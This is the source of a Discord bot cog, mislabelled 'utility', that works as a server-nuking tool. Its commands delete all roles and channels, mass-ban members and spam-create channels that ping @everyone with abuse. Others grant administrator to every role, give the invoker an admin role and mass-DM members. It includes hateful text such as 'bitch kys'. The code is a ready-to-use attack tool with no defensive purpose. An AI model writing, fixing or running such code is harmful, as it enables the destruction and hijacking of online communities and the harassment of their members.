import discord, os, sys
from discord.ext import commands


# Don't play with any of the code if you don't understand it

def check(member, client):
  if member.id == client.user.id:
    return True
  else:
    return False

def global_check(member, client):
  if member.id in client.owner_ids:
    return False
  else:
    return True

async def del_cmd(ctx, client):
  if client.delete:
    try:
      await ctx.message.delete()
    except:
      pass

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

async def notify(ctx, message):
  try:
    await ctx.author.send(message)
  except:
    print(f"{'-'*15}\nCouldn't send the following message to {ctx.author}.\n{'-'*15}\n{message}\n{'-'*15}")

class utility(commands.Cog):
  def __init__(self, client):
    self.client = client


  @commands.command(help = 'Attempts to delete all the roles in the server.')
  async def roles(self, ctx):
    await del_cmd(ctx, ctx.bot)
    count = 0
    for roles in ctx.guild.roles:
      try:
        await roles.delete(reason = "Fuck yourself")
      except:
        pass
      else:
        count += 1
    if count == 0:
      return await notify(ctx, "Couldn't delete any role.")
    
    await notify(ctx, f'Deleted `{count}` roles.')
    

  @commands.command(help = 'Attempts to delete all the channels in the server.')
  async def channels(self, ctx):
    await del_cmd(ctx, ctx.bot)
    count = 0
    for channels in ctx.guild.channels:
      try:
        await channels.delete(reason = "Fuck you")
      except:
        pass
      else:
        count += 1
      
    if count == 0:
      return await notify(ctx, "Couldn't delete any channel.")
    
    await notify(ctx, f'Deleted `{count}` channels.')

  @commands.command(help = 'Attempts to ban all the members in the server.')  
  async def members(self, ctx):
    await del_cmd(ctx, ctx.bot)
    banned = 0
    for members in ctx.guild.members:
      try:
        if global_check(members, ctx.bot):
          pass
        else:
          await members.ban(reason = "bitch kys")
          banned += 1
      except Exception:
        pass
    if banned == 0:
      return await notify(ctx, "Couldn't ban any member.")
    await notify(ctx, f"Banned `{banned}` members.")

  @commands.command(help = 'Attempts to spam-create channels & roles.')
  async def spam(self, ctx):
    await del_cmd(ctx, ctx.bot)
    success = True
    for i in range(100):
      try:
        chnl = await ctx.guild.create_text_channel(name = "fuck yall")
      except:
        await notify(ctx, "I don't have the permission to create channels.")
        success = False
        break
      await chnl.send("@everyone fuck yourself bitch")
      await ctx.guild.create_role(name = "nuked")

    if success:
      await notify(ctx, "Finished spam-creating channels & roles.")

  @commands.command(help = 'Attempts to edit all the roles permissions and give them administration permission.')
  async def chaos(self, ctx):
    await del_cmd(ctx, ctx.bot)
    perms = discord.Permissions(administrator=True)
    roles = 0
    for role in ctx.guild.roles:
      roles += 1
      try:
        await role.edit(permissions = perms)
      except Exception:
        pass
    if roles == 0:
      return await notify(ctx, "Couldn't assign the edit any role's permissions.")
    await notify(ctx, "All roles have administrator permission now.")

  @commands.command(help = 'Attempts to create a role with administration permission and add it to the user.')
  async def admin(self, ctx):
    await del_cmd(ctx, ctx.bot)
    perms = discord.Permissions(administrator=True)
    try:
      role = await ctx.guild.create_role(name = "new role", permissions = perms)
    except:
      return await notify(ctx, "I don't have the required permissions in order to make a command.")
    try:
      await ctx.author.add_roles(role)
    except:
      return await notify(ctx, "I don't have the required permissions in order to assign you the role.")
    await notify(ctx, "You now have administraor permissions.")


  @commands.command(help = 'Restarts the bot.')
  async def restart(self, ctx):
    await del_cmd(ctx, ctx.bot)
    await notify(ctx, "Restarting bot...")
    restart_program()


  @commands.command(help = 'Stops the bot.')
  async def stop(self, ctx):
    await del_cmd(ctx, ctx.bot)
    await notify(ctx, "Bot stopped.")
    await ctx.bot.close()

  @commands.command('Attempts to send a message to all members in the server.')
  async def spamusers(self, ctx, *, message):
    count = 0
    for member in ctx.guild.members:
      if global_check(member, ctx.client):
        pass
      else:
        try:
          await member.send(message)
        except:
          pass
        else:
          count += 1
    if count == 0:
      return await notify(ctx, "Couldn't message any member.")
    await notify(ctx, f"Sent your message to `{count}` members.")


def setup(client):
  client.add_cog(utility(client))
